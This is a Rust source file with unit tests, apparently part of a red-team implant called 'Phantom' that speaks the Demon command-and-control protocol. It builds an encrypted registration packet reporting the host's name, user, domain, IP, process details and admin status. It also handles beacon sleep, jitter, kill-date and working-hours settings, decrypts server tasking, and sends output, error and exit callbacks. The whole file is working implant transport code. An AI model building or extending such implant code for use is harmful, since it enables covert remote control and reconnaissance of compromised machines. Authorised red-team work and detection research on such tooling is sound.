//! Demon-compatible transport helpers for Phantom.

use std::path::Path;

use red_cell_common::crypto::{
    AGENT_IV_LENGTH, AGENT_KEY_LENGTH, AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data,
    decrypt_agent_data_at_offset, encrypt_agent_data, encrypt_agent_data_at_offset,
};
use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonEnvelope, DemonMessage, DemonPackage,
};

use crate::error::PhantomError;

/// Host metadata sent in the initial `DEMON_INIT` registration.
#[derive(Debug, Clone)]
pub struct AgentMetadata {
    /// Machine hostname.
    pub hostname: String,
    /// Effective username.
    pub username: String,
    /// Domain or workgroup.
    pub domain_name: String,
    /// Best-effort internal IP address.
    pub internal_ip: String,
    /// Executable path.
    pub process_path: String,
    /// Current process identifier.
    pub process_pid: u32,
    /// Current thread identifier.
    pub process_tid: u32,
    /// Parent process identifier.
    pub process_ppid: u32,
    /// Process architecture.
    pub process_arch: u32,
    /// Elevated/admin flag.
    pub elevated: bool,
    /// Base address placeholder.
    pub base_address: u64,
    /// OS major version placeholder.
    pub os_major: u32,
    /// OS minor version placeholder.
    pub os_minor: u32,
    /// OS product type placeholder.
    pub os_product_type: u32,
    /// OS service pack placeholder.
    pub os_service_pack: u32,
    /// OS build placeholder.
    pub os_build: u32,
    /// OS architecture.
    pub os_arch: u32,
    /// Sleep delay in milliseconds.
    pub sleep_delay: u32,
    /// Sleep jitter percentage.
    pub sleep_jitter: u32,
    /// Kill date timestamp or zero.
    pub kill_date: u64,
    /// Working-hours bitmask or zero.
    pub working_hours: i32,
}

/// Decrypted task stream plus the next shared CTR offset.
#[derive(Debug, Clone)]
pub struct TaskingResponse {
    /// Parsed task packages.
    pub packages: Vec<DemonPackage>,
    /// Shared CTR offset after consuming the response body.
    pub next_ctr_offset: u64,
}

/// Build a `DEMON_INIT` packet matching the Demon transport framing.
pub fn build_init_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    metadata: &AgentMetadata,
) -> Result<Vec<u8>, PhantomError> {
    let plaintext = serialize_init_metadata(agent_id, metadata)?;
    let encrypted = encrypt_agent_data(&crypto.key, &crypto.iv, &plaintext)?;

    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + encrypted.len();
    let mut payload = Vec::with_capacity(payload_len);
    payload.extend_from_slice(&u32::from(DemonCommand::DemonInit).to_be_bytes());
    payload.extend_from_slice(&0_u32.to_be_bytes());
    payload.extend_from_slice(&crypto.key);
    payload.extend_from_slice(&crypto.iv);
    payload.extend_from_slice(&encrypted);

    let envelope = DemonEnvelope::new(agent_id, payload)?;
    Ok(envelope.to_bytes())
}

/// Parse the init acknowledgement and return the consumed receive CTR blocks.
pub fn parse_init_ack(
    response_body: &[u8],
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
) -> Result<u64, PhantomError> {
    if response_body.is_empty() {
        return Err(PhantomError::InvalidResponse("empty init acknowledgement"));
    }

    let decrypted = decrypt_agent_data(&crypto.key, &crypto.iv, response_body)?;
    let acked_id = decrypted
        .get(..4)
        .ok_or(PhantomError::InvalidResponse("init acknowledgement too short"))?;
    let acked_id = u32::from_le_bytes(
        acked_id
            .try_into()
            .map_err(|_| PhantomError::InvalidResponse("invalid init acknowledgement body"))?,
    );

    if acked_id != agent_id {
        return Err(PhantomError::InvalidResponse("init acknowledgement agent_id mismatch"));
    }

    Ok(ctr_blocks_for_len(response_body.len()))
}

/// Decrypt a tasking response body into packages.
pub fn parse_tasking_response(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    response_body: &[u8],
) -> Result<TaskingResponse, PhantomError> {
    if response_body.is_empty() {
        return Ok(TaskingResponse { packages: Vec::new(), next_ctr_offset: ctr_offset });
    }

    let encrypted_payload = match DemonEnvelope::from_bytes(response_body) {
        Ok(envelope) => {
            if envelope.header.agent_id != agent_id {
                return Err(PhantomError::InvalidResponse("task envelope agent_id mismatch"));
            }
            envelope.payload
        }
        Err(_) => response_body.to_vec(),
    };

    let decrypted =
        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, ctr_offset, &encrypted_payload)?;
    let message = DemonMessage::from_bytes(&decrypted)?;

    Ok(TaskingResponse {
        packages: message.packages,
        next_ctr_offset: ctr_offset + ctr_blocks_for_len(encrypted_payload.len()),
    })
}

/// Build a generic output callback packet.
#[allow(dead_code)]
pub fn build_output_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    request_id: u32,
    text: &str,
) -> Result<Vec<u8>, PhantomError> {
    let payload = length_prefixed_bytes(text.as_bytes())?;
    build_callback_packet(
        agent_id,
        crypto,
        ctr_offset,
        u32::from(DemonCommand::CommandOutput),
        request_id,
        &payload,
    )
}

/// Build a generic error callback packet.
#[allow(dead_code)]
pub fn build_error_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    request_id: u32,
    text: &str,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&u32::from(DemonCallback::ErrorMessage).to_be_bytes());
    payload.extend_from_slice(&length_prefixed_bytes(text.as_bytes())?);
    build_callback_packet(
        agent_id,
        crypto,
        ctr_offset,
        u32::from(DemonCommand::CommandError),
        request_id,
        &payload,
    )
}

/// Build an exit callback packet.
#[allow(dead_code)]
pub fn build_exit_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    request_id: u32,
    exit_method: u32,
) -> Result<Vec<u8>, PhantomError> {
    build_callback_packet(
        agent_id,
        crypto,
        ctr_offset,
        u32::from(DemonCommand::CommandExit),
        request_id,
        &exit_method.to_be_bytes(),
    )
}

/// Return the number of CTR blocks consumed by a callback payload body.
///
/// Only `payload_len(4) | payload` is encrypted; `command_id` and `request_id`
/// are transmitted in the clear.
#[must_use]
pub fn callback_ctr_blocks(callback_payload_len: usize) -> u64 {
    ctr_blocks_for_len(4 + callback_payload_len)
}

pub(crate) fn build_callback_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    command_id: u32,
    request_id: u32,
    callback_payload: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    // Only payload_len + payload are encrypted; command_id and request_id
    // remain in the clear so the teamserver can read them before decryption.
    let mut plaintext = Vec::with_capacity(4 + callback_payload.len());
    let payload_len = u32::try_from(callback_payload.len())
        .map_err(|_| PhantomError::InvalidResponse("callback payload too large"))?;
    plaintext.extend_from_slice(&payload_len.to_be_bytes());
    plaintext.extend_from_slice(callback_payload);

    let encrypted = encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, ctr_offset, &plaintext)?;

    let mut body = Vec::with_capacity(8 + encrypted.len());
    body.extend_from_slice(&command_id.to_be_bytes());
    body.extend_from_slice(&request_id.to_be_bytes());
    body.extend_from_slice(&encrypted);

    let envelope = DemonEnvelope::new(agent_id, body)?;
    Ok(envelope.to_bytes())
}

fn serialize_init_metadata(
    agent_id: u32,
    metadata: &AgentMetadata,
) -> Result<Vec<u8>, PhantomError> {
    let mut buf = Vec::with_capacity(256);

    buf.extend_from_slice(&agent_id.to_be_bytes());
    buf.extend_from_slice(&length_prefixed_bytes(metadata.hostname.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_bytes(metadata.username.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_bytes(metadata.domain_name.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_bytes(metadata.internal_ip.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_utf16le(&metadata.process_path)?);
    buf.extend_from_slice(&metadata.process_pid.to_be_bytes());
    buf.extend_from_slice(&metadata.process_tid.to_be_bytes());
    buf.extend_from_slice(&metadata.process_ppid.to_be_bytes());
    buf.extend_from_slice(&metadata.process_arch.to_be_bytes());
    buf.extend_from_slice(&u32::from(metadata.elevated).to_be_bytes());
    buf.extend_from_slice(&metadata.base_address.to_be_bytes());
    buf.extend_from_slice(&metadata.os_major.to_be_bytes());
    buf.extend_from_slice(&metadata.os_minor.to_be_bytes());
    buf.extend_from_slice(&metadata.os_product_type.to_be_bytes());
    buf.extend_from_slice(&metadata.os_service_pack.to_be_bytes());
    buf.extend_from_slice(&metadata.os_build.to_be_bytes());
    buf.extend_from_slice(&metadata.os_arch.to_be_bytes());
    buf.extend_from_slice(&metadata.sleep_delay.to_be_bytes());
    buf.extend_from_slice(&metadata.sleep_jitter.to_be_bytes());
    buf.extend_from_slice(&metadata.kill_date.to_be_bytes());
    buf.extend_from_slice(&metadata.working_hours.to_be_bytes());

    Ok(buf)
}

fn length_prefixed_bytes(bytes: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(bytes.len())
        .map_err(|_| PhantomError::InvalidResponse("length-prefixed field too large"))?;
    let mut out = Vec::with_capacity(4 + bytes.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(bytes);
    Ok(out)
}

fn length_prefixed_utf16le(value: &str) -> Result<Vec<u8>, PhantomError> {
    let utf16 = value.encode_utf16().collect::<Vec<_>>();
    let byte_len = utf16
        .len()
        .checked_mul(2)
        .ok_or(PhantomError::InvalidResponse("UTF-16LE field length overflow"))?;
    let len = u32::try_from(byte_len)
        .map_err(|_| PhantomError::InvalidResponse("UTF-16LE field too large"))?;
    let mut out = Vec::with_capacity(4 + byte_len);
    out.extend_from_slice(&len.to_be_bytes());
    for unit in utf16 {
        out.extend_from_slice(&unit.to_le_bytes());
    }
    Ok(out)
}

/// Best-effort executable name for process listings.
#[must_use]
pub fn executable_name(path: &Path) -> String {
    path.file_name()
        .and_then(|value| value.to_str())
        .map_or_else(|| path.display().to_string(), String::from)
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use red_cell_common::crypto::{
        decrypt_agent_data, decrypt_agent_data_at_offset, encrypt_agent_data,
        generate_agent_crypto_material,
    };
    use red_cell_common::demon::{DEMON_MAGIC_VALUE, DemonCallback, DemonCommand};

    use super::{
        AgentMetadata, build_error_packet, build_exit_packet, build_init_packet,
        build_output_packet, callback_ctr_blocks, executable_name, parse_init_ack,
        parse_tasking_response,
    };

    fn metadata() -> AgentMetadata {
        AgentMetadata {
            hostname: String::from("linux-host"),
            username: String::from("operator"),
            domain_name: String::from("WORKGROUP"),
            internal_ip: String::from("127.0.0.1"),
            process_path: String::from("/usr/bin/phantom"),
            process_pid: 123,
            process_tid: 0,
            process_ppid: 1,
            process_arch: 2,
            elevated: false,
            base_address: 0,
            os_major: 6,
            os_minor: 8,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 0,
            os_arch: 9,
            sleep_delay: 5_000,
            sleep_jitter: 0,
            kill_date: 0,
            working_hours: 0,
        }
    }

    #[test]
    fn init_packet_uses_demon_header() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let packet = build_init_packet(0x4142_4344, &crypto, &metadata()).expect("packet");
        assert_eq!(&packet[4..8], &DEMON_MAGIC_VALUE.to_be_bytes());
        assert_eq!(&packet[8..12], &0x4142_4344_u32.to_be_bytes());
    }

    #[test]
    fn output_packet_encrypts_payload() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let packet = build_output_packet(7, &crypto, 0, 99, "hello").expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandOutput).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &99_u32.to_be_bytes());

        // Remainder is encrypted payload_len + payload.
        let plaintext =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[8..]).expect("decrypt");
        let payload_len = u32::from_be_bytes(plaintext[..4].try_into().expect("len")) as usize;
        assert_eq!(payload_len, 4 + "hello".len()); // length-prefixed bytes
    }

    #[test]
    fn tasking_response_accepts_raw_encrypted_message() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let package =
            red_cell_common::demon::DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let message = red_cell_common::demon::DemonMessage::new(vec![package]);
        let plaintext = message.to_bytes().expect("message");
        let encrypted = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &crypto.key,
            &crypto.iv,
            0,
            &plaintext,
        )
        .expect("encrypt");

        let response = parse_tasking_response(11, &crypto, 0, &encrypted).expect("response");
        assert_eq!(response.packages.len(), 1);
        assert_eq!(response.next_ctr_offset, callback_ctr_blocks(0));
    }

    #[test]
    fn parse_init_ack_returns_consumed_ctr_blocks() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let agent_id = 0x1337_4242_u32;
        let ack = encrypt_agent_data(&crypto.key, &crypto.iv, &agent_id.to_le_bytes())
            .expect("encrypted ack");

        let ctr = parse_init_ack(&ack, agent_id, &crypto).expect("parse ack");

        assert_eq!(ctr, 1);
    }

    #[test]
    fn parse_init_ack_rejects_agent_id_mismatch() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let ack = encrypt_agent_data(&crypto.key, &crypto.iv, &0x1337_4242_u32.to_le_bytes())
            .expect("encrypted ack");

        let error = parse_init_ack(&ack, 0x4242_1337, &crypto).expect_err("mismatch");
        assert!(matches!(
            error,
            crate::error::PhantomError::InvalidResponse("init acknowledgement agent_id mismatch")
        ));
    }

    #[test]
    fn error_packet_encodes_callback_discriminator_and_message() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let packet = build_error_packet(7, &crypto, 0, 99, "boom").expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandError).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &99_u32.to_be_bytes());

        // Remainder is encrypted: payload_len(4) + callback_type(4) + len_prefixed("boom").
        let plaintext =
            decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, 0, &envelope.payload[8..])
                .expect("decrypt");
        assert_eq!(&plaintext[..4], &12_u32.to_be_bytes());
        assert_eq!(&plaintext[4..8], &u32::from(DemonCallback::ErrorMessage).to_be_bytes());
        assert_eq!(&plaintext[8..12], &4_u32.to_be_bytes());
        assert_eq!(&plaintext[12..16], b"boom");
    }

    #[test]
    fn exit_packet_encodes_exit_method() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let packet = build_exit_packet(7, &crypto, 0, 99, 3).expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandExit).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &99_u32.to_be_bytes());

        // Remainder is encrypted: payload_len(4) + exit_method(4).
        let plaintext =
            decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, 0, &envelope.payload[8..])
                .expect("decrypt");
        assert_eq!(&plaintext[..4], &4_u32.to_be_bytes());
        assert_eq!(&plaintext[4..8], &3_u32.to_be_bytes());
    }

    #[test]
    fn executable_name_uses_leaf_name_when_available() {
        assert_eq!(executable_name(Path::new("/usr/bin/bash")), "bash");
    }
}
